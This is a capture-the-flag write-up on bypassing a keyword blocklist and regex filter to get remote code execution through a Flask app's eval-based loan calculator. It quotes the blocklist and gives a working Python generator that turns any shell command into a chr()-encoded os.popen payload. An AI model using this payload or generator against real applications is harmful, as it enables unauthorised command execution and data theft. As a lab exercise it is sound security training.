Description:  
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?  
Hints:  
Bypass regex  
The flag file is /flag.txt  
You might need encoding or dynamic construction to bypass restrictions.  

Easy to see the app can execute any Python code using Flask. `Ctrl + U` to view source code, i saw they using blacklist to void dangerous command:  
```python
<!--
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-->
```
Our job is writing a payload which does not matching that "keyword" and "regex"  
We will using `__import__('builtins').__import__( <payload> )` to run the command. My idea is using `join` to merge the ASCII number of a char i want to complete payload.  
Our OS command will be `cat /flag.txt` according to hint number 2.  
Here my code to encoding a payload:  
```python
# This script encodes a shell command into a Python expression that can be executed using `os.popen` or `os.system`.
# Using it to bypass restrictions on direct command execution.
    
    # ------------
    # Secure python_flask eval execution by 
    #     1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
    #     2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'


def encode_command(cmd, method='popen'):
    ascii_list = [ord(c) for c in cmd]
    chr_expr = ','.join([f'chr({c})' for c in ascii_list])
    cmd_expr = f"''.join([{chr_expr}])"
    
    os_expr = "''.join([chr(111),chr(115)])"
    import_expr = "__import__('builtins').__import__"

    if method == 'popen': # Using popen to execute the command and read output
        final = f"{import_expr}({os_expr}).popen({cmd_expr}).read()"
    elif method == 'system': # Using system to execute the command without capturing output
        final = f"{import_expr}({os_expr}).system({cmd_expr})"
    else:
        raise ValueError("method must be 'popen' or 'system'")

    return final


if __name__ == "__main__":
    user_cmd = input("Enter shell command: ")  # e.g. cat /flag.txt, ls -la, etc.
    payload = encode_command(user_cmd, method='popen')
    print("\nPayload:\n")
    print(payload)

```
Input your payload then put in into the "Bank" and you will get the flag.  
Peace! 


